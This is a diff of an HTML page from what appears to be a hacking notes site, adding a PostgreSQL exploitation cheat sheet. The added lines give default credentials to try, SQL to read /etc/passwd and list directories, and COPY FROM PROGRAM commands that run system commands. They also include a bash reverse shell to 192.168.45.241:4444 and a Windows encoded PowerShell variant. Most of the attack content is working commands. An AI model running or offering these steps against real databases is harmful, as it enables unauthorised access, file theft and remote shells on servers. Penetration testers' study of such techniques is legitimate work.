@@ -8,7 +8,7 @@
     <link href="https://fonts.googleapis.com/css2?family=Maven+Pro:wght@400..900&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="/H4ckV4ult/styles/navBarStyles.css">
     <link rel="stylesheet" href="/H4ckV4ult/styles/walkthroughs.css">
-        <link href="/H4ckV4ult/styles/prism/prism.css" rel="stylesheet" />
+    <link href="/H4ckV4ult/styles/prism/prism.css" rel="stylesheet" />
     <script src="/H4ckV4ult/styles/prism/prism.js"></script>
     <title>Minimalist Webpage</title>
 
@@ -25,15 +25,53 @@
         <div class="notion-body">
             <h2>Usage</h2>
             <ul>
+                <p>Login into PostgreSQL</p>
+                <pre><code class="language-bash">psql -h 192.168.147.60 -p 5432 -U postgres</code></pre>
+                
                 <p>Show databases</p>
                 <pre><code class="language-bash">postgres=# \l</code></pre>
                 <p>Select database</p>
                 <pre><code class="language-bash">postgres=# \c database_name</code></pre>
                 <p>Show tables</p>
                 <pre><code class="language-bash">postgres=# \dt</code></pre>
+                <p>Show permissions</p>
+                <pre><code class="language-bash">postgres=# \du      #In case you see "superuser" you are now the boss</code></pre>
+            </ul> 
+            
+            <h2>Enumeration</h2>
+            <ul>
+                <h3>Default passwords</h3>
+                <ul>
+                   <pre><code class="language-bash">admin:admin
+postgres:postgres
+postgres:password
+postgres:admin
+admin:password</code></pre> 
+                </ul>
+            </ul>
 
-            </ul>    
-
+            <h3>Exploitation</h3>
+            <ul>
+                <p>All these steps can only be performed if you are a superuser.</p>
+                <h4>Reading files</h4>
+                <pre><code class="language-plsql">select * from pg_read_file('/etc/passwd', 0, 1000000);</code></pre> 
+                <h4>Listing directories</h4>
+                <pre><code class="language-plsql">select * from pg_ls_dir('/tmp');</code></pre>
+                <h4>Executing system commands</h4>
+                <pre><code class="language-plsql">DROP TABLE IF EXISTS cmd_exec;          #Prevents conflicts or errors when trying to create a table that already exists
+CREATE TABLE cmd_exec(cmd_output text); #Creates a table named cmd_exec with one column cmd_output of type text.This table will store the output of the executed command 
+COPY cmd_exec FROM PROGRAM 'id';        #Executes the id command on the server and inserts the output into the cmd_exec table
+SELECT * FROM cmd_exec;                 #Displays the output stored in the cmd_exec table
+DROP TABLE IF EXISTS cmd_exec;          #Deletes the cmd_exec table once it has served its purpose</code></pre>
+                <p>Performing reverse shell connection</p>
+                <pre><code class="language-plsql">DROP TABLE IF EXISTS cmd_exec;
+CREATE TABLE cmd_exec(cmd_output text);
+COPY cmd_exec FROM PROGRAM 'bash -c ''bash -i >& /dev/tcp/192.168.45.241/4444 0>&1''';</code></pre>
+                <p>We can do the same with windows</p>
+                <pre><code class="language-plsql">DROP TABLE IF EXISTS cmd_exec;
+CREATE TABLE cmd_exec(cmd_output text);
+COPY cmd_exec FROM PROGRAM 'cmd.exe /c powershell.exe -e BASE64_HERE';</code></pre>
+            </ul>
 
 
 </ul>    
